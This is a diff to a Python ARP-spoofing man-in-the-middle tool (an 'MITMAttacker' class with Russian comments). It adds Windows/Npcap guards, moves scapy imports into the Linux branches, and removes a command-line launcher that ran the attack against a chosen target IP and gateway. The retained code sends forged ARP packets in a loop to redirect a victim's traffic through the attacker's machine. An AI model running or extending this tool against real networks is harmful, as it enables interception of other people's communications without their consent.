@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from scapy.all import *
-from scapy.layers.l2 import ARP, Ether
+import platform
 import time
 import threading
 import subprocess
-import platform
 from typing import Optional, Dict
 from utils import enable_ip_forwarding, disable_ip_forwarding
 
@@ -29,17 +27,24 @@ class MITMAttacker:
         self.spoof_packets_sent = 0
         self.start_time = 0
 
+        # Проверяем платформу
+        if platform.system() == "Windows":
+            print("[!] MITM attacks require Npcap/WinPcap on Windows")
+            print("[!] Install Npcap from https://nmap.org/npcap/")
+            return
+
         # Получаем MAC адреса
         self._get_macs()
 
     def _get_macs(self):
         """Получить MAC адреса целевых устройств"""
-        self.target_mac = self._get_mac(self.target_ip)
-        self.gateway_mac = self._get_mac(self.gateway_ip)
+        if platform.system() == "Windows":
+            # На Windows без Npcap не можем получить MAC адреса
+            self.target_mac = "00:00:00:00:00:00"
+            self.gateway_mac = "00:00:00:00:00:00"
 
-        # Получаем собственный MAC
-        try:
-            if platform.system() == "Windows":
+            # Получаем собственный MAC
+            try:
                 result = subprocess.check_output(f"getmac /fo csv /v", shell=True, text=True)
                 lines = result.split('\n')
                 for line in lines:
@@ -48,15 +53,32 @@ class MITMAttacker:
                         if len(parts) > 2:
                             self.attacker_mac = parts[2].strip().replace('"', '')
                             break
-            else:
+            except:
+                self.attacker_mac = "00:00:00:00:00:00"
+        else:
+            # Оригинальный код для Linux
+            from scapy.all import ARP, Ether, srp
+
+            self.target_mac = self._get_mac(self.target_ip)
+            self.gateway_mac = self._get_mac(self.gateway_ip)
+
+            # Получаем собственный MAC
+            try:
                 with open(f"/sys/class/net/{self.interface}/address", 'r') as f:
                     self.attacker_mac = f.read().strip()
-        except:
-            pass
+            except:
+                pass
 
     def _get_mac(self, ip: str) -> Optional[str]:
         """Получить MAC адрес по IP"""
+        if platform.system() == "Windows":
+            # На Windows без Npcap не можем получить MAC по IP
+            return "00:00:00:00:00:00"
+
         try:
+            # Оригинальный код для Linux
+            from scapy.all import ARP, Ether, srp
+
             # Пытаемся получить из ARP кэша
             result = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, stderr=subprocess.DEVNULL)
             lines = result.split('\n')
@@ -84,7 +106,13 @@ class MITMAttacker:
 
     def spoof(self, target_ip: str, spoof_ip: str, target_mac: Optional[str] = None):
         """Отправить поддельный ARP пакет"""
+        if platform.system() == "Windows":
+            print("[!] ARP spoofing requires Npcap on Windows")
+            return False
+
         try:
+            from scapy.all import ARP, send
+
             if not target_mac:
                 target_mac = self._get_mac(target_ip)
 
@@ -110,7 +138,13 @@ class MITMAttacker:
 
     def restore(self, target_ip: str, gateway_ip: str):
         """Восстановить ARP таблицы"""
+        if platform.system() == "Windows":
+            print("[!] ARP restoration requires Npcap on Windows")
+            return False
+
         try:
+            from scapy.all import ARP, send
+
             target_mac = self._get_mac(target_ip)
             gateway_mac = self._get_mac(gateway_ip)
 
@@ -149,6 +183,11 @@ class MITMAttacker:
         if self.running:
             return
 
+        if platform.system() == "Windows":
+            print("[!] MITM attacks not available on Windows without Npcap")
+            print("[!] Install Npcap from https://nmap.org/npcap/")
+            return
+
         # Проверяем MAC адреса
         if not self.target_mac:
             print(f"[!] Не удалось получить MAC адрес цели: {self.target_ip}")
@@ -179,7 +218,7 @@ class MITMAttacker:
                 # Спуфим шлюз, что мы цель
                 self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
 
-                time.sleep(2)  # Отправляем ARP пакеты каждые 2 секунды
+                time.sleep(2)
 
         except KeyboardInterrupt:
             self.stop_attack()
@@ -198,8 +237,9 @@ class MITMAttacker:
         self.running = False
         self.spoofing = False
 
-        # Восстанавливаем ARP таблицы
-        self.restore(self.target_ip, self.gateway_ip)
+        # Восстанавливаем ARP таблицы (только на Linux)
+        if platform.system() != "Windows":
+            self.restore(self.target_ip, self.gateway_ip)
 
         # Выключаем IP forwarding
         disable_ip_forwarding()
@@ -223,30 +263,3 @@ class MITMAttacker:
             "spoof_packets_sent": self.spoof_packets_sent,
             "duration": time.time() - self.start_time if self.start_time > 0 else 0
         }
-
-
-# Функция для тестирования
-def test_mitm():
-    """Тестирование MITM атаки"""
-    import sys
-
-    if len(sys.argv) != 4:
-        print("Использование: python mitm_attacker.py <целевой_IP> <шлюз_IP> <интерфейс>")
-        print("Пример: python mitm_attacker.py 192.168.1.100 192.168.1.1 eth0")
-        return
-
-    target_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
-    interface = sys.argv[3]
-
-    attacker = MITMAttacker(target_ip, gateway_ip, interface)
-
-    try:
-        print("[*] Запуск MITM атаки. Нажмите Ctrl+C для остановки.")
-        attacker.start_attack()
-    except KeyboardInterrupt:
-        attacker.stop_attack()
-
-
-if __name__ == "__main__":
-    test_mitm()
